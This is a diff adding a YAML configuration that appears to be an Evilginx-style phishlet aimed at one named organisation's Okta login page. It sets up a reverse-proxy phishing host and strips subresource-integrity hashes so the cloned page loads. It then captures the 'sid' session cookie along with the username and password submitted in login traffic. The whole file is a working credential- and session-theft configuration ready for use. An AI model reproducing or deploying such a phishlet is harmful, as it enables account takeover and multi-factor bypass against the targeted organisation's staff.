@@ -1,0 +1,23 @@
+author: '@bbalickschreiber' #modifications to template created by @mikesiegel
+min_ver: '2.3.0'
+proxy_hosts:
+  #  - {phish_sub: 'login', orig_sub: 'login', domain: 'okta.com', session: false, is_landing: false}
+  #- {phish_sub: '', orig_sub: '', domain: 'okta.com', session: false, is_landing: false }
+  - {phish_sub: '', orig_sub: 'moveworks', domain: 'okta.com', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'moveworks.okta.com', orig_sub: '', domain: 'moveworks.okta.com', search: 'sha384-.{64}', replace: '', mimes: ['text/html']}
+auth_tokens:
+  - domain: 'moveworks.okta.com'
+    keys: ['sid']
+credentials:
+  username:
+    key: ''
+    search: '"username":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+login:
+  domain: 'moveworks.okta.com'
+  path: '/login/login.htm'
